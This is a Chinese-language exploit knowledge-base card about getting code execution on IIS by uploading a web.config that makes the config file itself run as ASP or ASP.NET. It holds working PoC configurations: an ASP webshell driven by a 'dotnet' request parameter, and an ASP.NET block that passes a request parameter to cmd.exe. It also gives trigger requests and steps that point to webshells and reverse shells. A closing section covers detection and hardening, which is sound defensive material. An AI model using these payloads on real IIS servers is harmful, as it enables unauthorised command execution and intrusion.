---
id: web-dotnet-iis-webconfig-handler-self-execution
title: IIS 上传 web.config 自解析执行：*.config 映射 asp.dll 或 PageBuildProvider，带参数执行任意 ASP/ASP.NET 代码
type: scenario
domain: web
path: web/dotnet/iis
technique: iis-webconfig-handler-self-execution
tags:
- iis
- web-config
- asp
- aspx
- handler
- isapi
- pagebuildprovider
- file-upload
- rce
- dotnet
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V594
  verified_at: '2026-11-12T15:44:21+08:00'
  notes: 已对照原文及全部 4 张截图核对（原图 1451x561/1437x717/1454x749/1444x674 全部>1200px，已降采样到 img_small/01-04.jpg 阅读，无失败）：0x01 的 handlers add path=*.config modules=IsapiModule scriptProcessor=%windir%\system32\inetsrv\asp.dll requireAccess=Write preCondition=bitness64、requestFiltering remove .config/remove web.config 隐藏段、ASP 代码置入 XML 注释并由 execute(request('dotnet')) 执行，图 01 /web.config?dotnet=response.write(now()) 返回日期；0x02 的 compilation/buildProviders PageBuildProvider extension=.config + httpHandlers PageHandlerFactory path=web.config，图 02 view-source 显示 tasklist 输出。卡内 PoC 将原文 httpContext.Request['c']/flag 包裹改写为 Request['c'] 判空并已注明“包裹方式需按编译模型微调”，不影响复现。与 accessPolicy 卡为不同技术（自解析 vs 解除既有脚本限制），互链成立；dedup top 候选 CCFlow web.config-aspx、托管模块后门、download.aspx、WebDAV 等均不同链。未在本机复跑。
url: /docs/web/dotnet/iis/web-dotnet-iis-webconfig-handler-self-execution/
draft: false
kb_aliases:
- web.config 上传 RCE
- IsapiModule asp.dll 处理器
- PageBuildProvider web.config
- PageHandlerFactory web.config
- accessPolicy Read Script Write
- .config 当脚本执行
- IIS 配置文件自解析
---

## 一句话结论

只要能把一个自定义 `web.config` 写进 IIS 的 Web 可访问目录，就能在该目录的配置里把 `*.config` 本身注册给 `asp.dll`（IsapiModule）或 `PageBuildProvider`/`PageHandlerFactory`，使这个配置文件被当成 ASP/ASP.NET 页面编译执行；再从请求参数传入代码或命令，即可在无法上传 `.asp/.aspx` 的场景下拿到 IIS 应用池权限的 RCE。

## 原理

- **web.config 是目录级配置**：IIS 在请求进入某个目录时读取该目录（及父目录）的 `web.config`，其中的 `handlers`、`httpHandlers`、`compilation` 等节决定“什么扩展名交给哪个处理器”。配置文件本身是攻击者可控的数据，一旦可写，等价于控制该目录的请求处理逻辑。
- **ASP 变体（0x01）**：在 `web.config` 的 `<system.webServer><handlers>` 中加入
  `<add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />`，
  把 `*.config` 的请求交给经典 ASP 引擎；同时用 `<requestFiltering>` 删除 `.config` 的文件扩展名限制并移除 `web.config` 隐藏段：
  `<remove fileExtension=".config" />`、`<remove segment="web.config" />`。这样访问 `/web.config` 时 IIS 不再拦截/隐藏该文件，而是交给 `asp.dll` 执行文件中的 ASP 代码。
- **ASP 代码存放**：配置文件必须是合法 XML，ASP 代码放在 XML/HTML 注释块中（注释内容对配置解析无害，而经典 ASP 解析器仍扫描 `<% %>`）。案例通过 `execute(request("dotnet"))` 直接执行请求参数里的 ASP 代码，`/web.config?dotnet=response.write(now())` 返回当前日期，证明脚本执行。
- **ASP.NET 变体（0x02）**：在 `<system.web><compilation>` 中注册
  `<buildProviders><add extension=".config" type="System.Web.Compilation.PageBuildProvider" /></buildProviders>`，
  并在 `<httpHandlers>` 中注册
  `<add path="web.config" type="System.Web.UI.PageHandlerFactory" verb="*" />`；
  这样 `web.config` 被当作 ASP.NET 页面编译，文件中的服务端代码（`<% %>`/`<script runat="server">` 代码块，置于注释中以保持 XML 合法）在请求时执行。案例代码读取 `Request["c"]`，用 `System.Diagnostics.Process` 启动 `cmd.exe /c <c>`，把 `tasklist` 输出写入响应。
- **为什么能成**：IIS 默认通过 `requestFiltering` 的 `fileExtensions`/`hiddenSegments` 阻止直接请求 `web.config`，但这两项都可以在目录级 `web.config` 里被删除；`handlers` 映射又是逐目录生效的，因此“写配置”直接变成“写执行逻辑”。前提是目标 IIS 允许在该目录覆盖 `handlers` 节（未被 `overrideModeDefault="Deny"` 锁定），且应用程序池启用了对应的 ASP/ASP.NET 运行时。

## 触发条件

- 存在任意文件上传/任意文件写入，且能把文件命名为 `web.config` 并落到 Web 根内可访问目录（上传目录也可）。
- 目标 IIS 支持经典 ASP（asp.dll 存在）或 ASP.NET（应用程序池非“无托管代码”），且目录允许覆盖 `handlers`/`httpHandlers`/`compilation` 配置节。
- `requestFiltering` 未被配置为禁止删除 `.config` 扩展名或 `web.config` 隐藏段（默认允许在本地配置中覆盖）。
- 攻击者能请求该 `web.config` 或其所在目录下的文件；如果目录本身禁止脚本执行，还需配合 accessPolicy 改写（见关联卡）。

## 利用步骤

1. 先确认上传目录可写且文件可通过 HTTP 访问；尝试上传一个无害的 `web.config`（可先备份/记录原内容）。
2. ASP 目标：写入带 `IsapiModule` + `asp.dll` 处理器、删除 `.config` 限制与 `web.config` 隐藏段的配置，文件内放入 ASP 代码（注释块中）。
3. 访问 `/web.config?dotnet=response.write(now())` 或等价参数，确认 ASP 代码执行。
4. .NET 目标：写入 `PageBuildProvider` + `PageHandlerFactory` 配置，文件内的 ASP.NET 代码读取请求参数并执行系统命令。
5. 访问 `/web.config?c=tasklist`，确认命令输出出现在响应中。
6. 后续可把代码换成 Webshell/内存马、命令回显或反弹 Shell；注意应用池权限（常见 `iis apppool\defaultapppool`）。

## PoC

ASP 变体（web.config，代码在注释中由 asp.dll 执行）：

```xml
<system.webServer>
  <handlers accessPolicy="Read, Script, Write">
    <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
         scriptProcessor="%windir%\system32\inetsrv\asp.dll"
         resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
  </handlers>
  <security>
    <requestFiltering>
      <fileExtensions><remove fileExtension=".config" /></fileExtensions>
      <hiddenSegments><remove segment="web.config" /></hiddenSegments>
    </requestFiltering>
  </security>
</system.webServer>
<!--
<%
Response.write("-"&"->")
Response.write(1+2)
on error resume next
if execute(request("dotnet")) <>"" then execute(request("dotnet"))
Response.write("<!-"&"-")
%>
-->
```

```text
GET /web.config?dotnet=response.write(now()) HTTP/1.1
Host: target
```

ASP.NET 变体（web.config 被 PageBuildProvider 当页面编译）：

```xml
<system.web>
  <compilation defaultLanguage="cs">
    <buildProviders>
      <add extension=".config" type="System.Web.Compilation.PageBuildProvider" />
    </buildProviders>
  </compilation>
  <httpHandlers>
    <add path="web.config" type="System.Web.UI.PageHandlerFactory" verb="*" />
  </httpHandlers>
</system.web>
<!-- 服务端代码块（<% %> / <script runat="server">）放在注释中以保持 XML 合法：
if (Request["c"] != null) {
  System.Diagnostics.Process p = new System.Diagnostics.Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + Request["c"];
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.UseShellExecute = false;
  p.Start();
  Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
  Response.End();
}
-->
```

```text
GET /web.config?c=tasklist HTTP/1.1
Host: target
```

案例中两类 payload 均执行成功（返回当前日期、`tasklist` 进程列表）；代码块的具体包裹方式需按目标编译模型微调。未在本机复跑。

## 变体与关联

- 关联：[[web-dotnet-iis-upload-dir-accesspolicy-override]]（同一 web.config 上传原语，用于解除上传目录的脚本执行限制）。
- 关联：[[web-generic-file-upload-ccflow-iis-webconfig-aspx]]（上传 web.config 移除 aspNetCore 并注册 aspx 处理器，让另上传的 aspx 解析）。
- 关联：[[web-dotnet-iis-managed-module-backdoor-bin-webconfig]]（web.config 注册 IIS 托管模块 DLL 的后门方式）。
- 变体：`httpHandlers` 也可注册 `.ashx`、`.soap`、`.svc` 等处理器；ASP 变体可换成其它 ISAPI 扩展；`buildProviders` 可把任意扩展名映射为页面编译。
- 变体：配置节被锁定时，可尝试其它未被锁定的节、在更深子目录覆盖、或改用已注册处理器 + 文件上传。
- 边界：IIS 以 `overrideModeDefault="Deny"` 锁定 `handlers`/`httpHandlers` 时本地 web.config 会报 500.19；应用程序池“无托管代码”时 ASP.NET 配置无效；`requestFiltering` 的隐藏段若被父级锁定，`remove` 可能失效。

## 检测与防御

- **上传侧**：禁止上传 `web.config`/`*.config`（按文件名与内容双重校验），上传目录与 Web 根分离，写权限最小化。
- **IIS 加固**：在 `applicationHost.config` 中锁定 `handlers`、`httpHandlers`、`compilation`、`requestFiltering` 等节（`overrideModeDefault="Deny"`），保持 `web.config` 在 `hiddenSegments` 且不可被本地删除；上传目录设置 `accessPolicy` 只读并禁止脚本。
- **运行侧**：上传目录所在应用池使用“无托管代码”或最小权限账户；关闭不需要的 ASP/ASP.NET 功能；开启 IIS 配置变更审计。
- **检测**：监控上传目录新增/修改的 `web.config`；请求 `/web.config`、`*.config?参数=` 或带命令参数的 .config 访问；403.1/500.19 异常；IIS 进程（w3wp）创建 cmd/powershell 子进程。
- **响应**：发现可疑 web.config 立即删除/回滚，审计同目录新上传文件与访问日志，轮换可能泄露的凭据并检查应用池权限。
